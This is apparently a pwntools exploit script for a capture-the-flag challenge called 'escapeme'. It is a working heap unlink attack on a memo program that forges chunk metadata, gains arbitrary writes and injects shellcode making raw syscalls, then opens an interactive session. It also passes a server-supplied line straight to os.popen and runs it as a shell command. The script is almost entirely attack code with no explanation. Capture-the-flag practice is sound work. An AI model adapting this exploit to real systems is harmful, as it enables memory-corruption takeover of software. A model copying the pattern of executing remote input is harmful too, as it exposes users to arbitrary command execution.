from pwn import *
import os
import sys

local=0
test=1
if test:
    pc='./kvm.elf ./kernel.bin ./memo-static.elf'.split(' ')
    mmap_address=0x7fff1ff000
else:
    pc='./memo-static.elf'
    mmap_address=0x155555550000

remote_addr="escapeme.chal.ctf.westerns.tokyo"
remote_port=16359
aslr=False
#context.log_level=True

#libc=ELF('./libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')

if local==1:
    p = process(pc,aslr=aslr)
#    gdb.attach(p,'c')
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
else:
    p=remote(remote_addr,remote_port)
    p.sendline(os.popen(p.recvline()).read())

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a==0):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(idx):
    sla("> ",str(idx))

def alloc(content):
    choice(1)
    sa('> ',content)

def edit(idx,content):
    choice(2)
    sla("> ",str(idx))
    sa('> ',content)

def free(idx):
    choice(3)
    sla("> ",str(idx))

if __name__ == '__main__':
    alloc("A"*0x28)
    B_address=mmap_address+0x10
    payload=p64(0)+p64(0x21)+p64(B_address-0x18)+p64(B_address-0x10)+p64(0x20)
    alloc(payload)
    alloc("C"*0x28)
    alloc("D"*0x28)
    alloc("E"*0x28)
    edit(2,'C'*0x20+p64(0x20+0x30)+p8(0x30))
    free(3)
    edit(1, p64(0x604098)[:3])
    shellcode_addr=0x606060
    #payload="\x48\xc7\xc7\x50\x40\x60\x00\x48\xbe\xef\xbe\xad\xde\x00\x00\x00\x00\x48\x89\x37\xeb\xea"
    payload=asm(shellcraft.amd64.linux.syscall(0,0,shellcode_addr,0x800),os="linux",arch="amd64")
    #payload=asm(shellcraft.amd64.linux.echo("fuck"),os="linux",arch="amd64")
    #payload=asm(shellcraft.amd64.linux.write("h"))
    payload+="\xeb\xea"
    print(len(payload))
    alloc(payload)
    alloc("F"*0x28)
    alloc("G"*0x28)
    edit(0, p64(0x604038)[:3])
    alloc("J"*0x28)
    alloc("H"*0x20+p64(mmap_address+0x18))
    stack_ret=0x7fffffffd8
    alloc(p64(0)+p64(stack_ret)+p64(0))
    edit(3,p64(shellcode_addr)[:3])
    payload=asm(shellcraft.amd64.linux.syscall(0x10c8),os="linux",arch="amd64")
    #payload+=asm(shellcraft.amd64.linux.syscall(0,0,shellcode_addr,0x800),os="linux",arch="amd64")
    #payload=asm(shellcraft.amd64.linux.syscall('SYS_mmap', 0, 0x1000,'PROT_READ | PROT_WRITE | PROT_EXEC','MAP_PRIVATE | MAP_ANONYMOUS',-1, 0),os='linux',arch='amd64')
    payload+=asm("mov rdi,0x606020",os="linux",arch="amd64")
    payload+=asm("mov [rdi],rax",os="linux",arch="amd64")
    payload+=asm(shellcraft.amd64.linux.syscall(10,0x7fff1fe000,0x1000,7),os="linux",arch="amd64")
    payload+=asm(shellcraft.amd64.linux.syscall(1,1,0x7fff1fe000,0x40),os="linux",arch="amd64")
    payload+=asm(shellcraft.amd64.linux.echo("stGOGO\n"),os="linux",arch="amd64")
    payload='\x90'*0x30+payload
    rl()
    p.sendline(payload)
    p.interactive()
